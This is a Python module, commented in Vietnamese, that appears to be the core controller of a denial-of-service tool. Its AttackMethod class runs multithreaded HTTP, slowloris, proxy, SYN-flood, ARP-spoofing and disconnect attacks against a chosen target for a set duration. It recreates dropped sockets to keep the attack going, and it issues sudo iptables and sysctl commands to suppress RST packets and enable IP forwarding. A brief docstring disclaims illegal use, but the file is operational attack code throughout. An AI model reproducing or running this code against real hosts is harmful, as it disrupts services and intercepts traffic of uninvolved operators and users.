"""Module cung cấp lớp AttackMethod để thực hiện các cuộc tấn công DoS.

Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật và chính sách sử dụng của các dịch vụ mạng.
Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường kiểm soát.
"""

from __future__ import annotations

import logging
import os
import socket
import sys
from threading import Thread
from time import sleep, time
from typing import Dict, Iterator, List, Tuple, Union

from colorama import Fore as F
from humanfriendly import Spinner, format_timespan

from tools.addons.ip_tools import get_host_ip, get_target_address
from tools.addons.sockets import create_socket, create_socket_proxy

# Cấu hình logging (có thể cấu hình thêm file handler nếu cần)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%H:%M:%S",
)


class AttackMethod:
    """Lớp quản lý các thao tác nội bộ của cuộc tấn công DoS."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        sleep_time: int = 15,
    ):
        """
        Khởi tạo đối tượng tấn công.

        Args:
            method_name: Tên phương thức tấn công (ví dụ: "http", "syn-flood", "slowloris", ...)
            duration: Thời gian tấn công (giây)
            threads: Số lượng thread tấn công
            target: URL hoặc IP của mục tiêu
            sleep_time: Thời gian chờ giữa các lần gọi (dành riêng cho Slowloris)
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.sleep_time = sleep_time
        self.threads: List[Thread] = []
        self.is_running = False

    def get_method_by_name(self) -> None:
        """
        Xác định hàm flood tương ứng dựa trên tên phương thức tấn công.

        Cài đặt các cấu hình bổ sung (ví dụ cấu hình iptables đối với syn-flood hay bật ip_forward với arp-spoof).
        """
        if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
            self.layer_number = 7
        elif self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
            self.layer_number = 4
        elif self.method_name in ["arp-spoof", "disconnect"]:
            if self.method_name == "arp-spoof":
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            self.layer_number = 2
        else:
            logging.error("Phương thức tấn công không được hỗ trợ: %s", self.method_name)
            sys.exit(1)

        directory = f"tools.L{self.layer_number}.{self.method_name}"
        try:
            module = __import__(directory, fromlist=["object"])
            self.method = getattr(module, "flood")
            logging.info("Đã load thành công module %s", directory)
        except (ImportError, AttributeError) as e:
            logging.error("Không load được module %s: %s", directory, e)
            sys.exit(1)

    def __enter__(self) -> AttackMethod:
        """Thiết lập hàm flood và cập nhật target nếu cần."""
        self.get_method_by_name()
        if self.layer_number != 2:
            self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:
        """Khôi phục cấu hình hệ thống sau khi tấn công kết thúc."""
        if self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
        if self.method_name == "arp-spoof":
            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")

    def __run_timer(self) -> None:
        """Đếm thời gian tấn công và tắt flag is_running khi hết thời gian."""
        stop_time = time() + self.duration
        while time() < stop_time:
            sleep(1)
        self.is_running = False

    def __slow_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """
        Xử lý riêng cho các phương thức slowloris (có hoặc không dùng proxy).

        Nếu gặp lỗi kết nối, thread sẽ được tạo mới để đảm bảo tấn công liên tục.
        """
        if "proxy" in self.method_name:
            try:
                self.method(args[0], args[1])
            except (ConnectionResetError, BrokenPipeError):
                logging.warning("Lỗi kết nối, tạo lại socket proxy.")
                new_args = create_socket_proxy(self.target)
                Thread(target=self.__run_flood, args=new_args).start()
        else:
            try:
                self.method(args[0])
            except (ConnectionResetError, BrokenPipeError):
                logging.warning("Lỗi kết nối, tạo lại socket.")
                new_socket = create_socket(self.target)
                Thread(target=self.__run_flood, args=(new_socket,)).start()
        sleep(self.sleep_time)

    def __run_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """
        Thực thi hàm flood liên tục cho đến khi flag is_running tắt.

        Gọi riêng __slow_flood nếu đang dùng phương thức slowloris.
        """
        while self.is_running:
            if "slowloris" in self.method_name:
                self.__slow_flood(*args)
            else:
                try:
                    self.method(self.target)
                except Exception as e:
                    logging.error("Lỗi trong quá trình flood: %s", e)

    def __slow_threads(self) -> Iterator[Thread]:
        """
        Tạo các thread cho phương thức slowloris (có hoặc không dùng proxy)
        với giao diện Spinner hiển thị tiến trình tạo socket.
        """
        with Spinner(
            label=f"{F.YELLOW}Creating {self.threads_count} Socket(s)...{F.RESET}",
            total=100,
        ) as spinner:
            for index in range(self.threads_count):
                if "proxy" in self.method_name:
                    yield Thread(
                        target=self.__run_flood, args=create_socket_proxy(self.target)
                    )
                else:
                    yield Thread(
                        target=self.__run_flood, args=(create_socket(self.target),)
                    )
                spinner.step(100 / self.threads_count * (index + 1))

    def __start_threads(self) -> None:
        """
        Khởi chạy các thread đã khởi tạo và hiển thị giao diện Spinner.
        """
        with Spinner(
            label=f"{F.YELLOW}Starting {self.threads_count} Thread(s){F.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

    def __run_threads(self) -> None:
        """
        Khởi tạo và chạy các thread tấn công.
        Sau đó, khởi động timer và chờ cho đến khi tất cả thread hoàn thành.
        """
        if "slowloris" in self.method_name:
            self.threads = list(self.__slow_threads())
        else:
            self.threads = [
                Thread(target=self.__run_flood) for _ in range(self.threads_count)
            ]

        self.__start_threads()

        # Khởi động timer để dừng tấn công sau thời gian quy định
        Thread(target=self.__run_timer).start()

        # Chờ cho đến khi tất cả thread kết thúc
        for thread in self.threads:
            thread.join()

        logging.info("Attack Completed!")

    def start(self) -> None:
        """
        Khởi động cuộc tấn công DoS.
        
        Hiển thị thông tin chi tiết về mục tiêu, phương thức và thời gian tấn công.
        """
        duration_str = format_timespan(self.duration)
        logging.info(
            "[!] Attacking %s using %s method. The attack will stop after %s.",
            self.target,
            self.method_name.upper(),
            duration_str,
        )
        if "slowloris" in self.method_name:
            logging.info("Sockets gặp lỗi sẽ được tự động tạo lại.")
        elif self.method_name == "http-proxy":
            logging.info("Proxies không trả về status 200 sẽ được tự động thay thế.")

        self.is_running = True

        try:
            self.__run_threads()
        except KeyboardInterrupt:
            self.is_running = False
            logging.warning("Ctrl+C detected. Stopping Attack...")
            for thread in self.threads:
                if thread.is_alive():
                    thread.join()
            logging.info("Attack Interrupted!")
            sys.exit(1)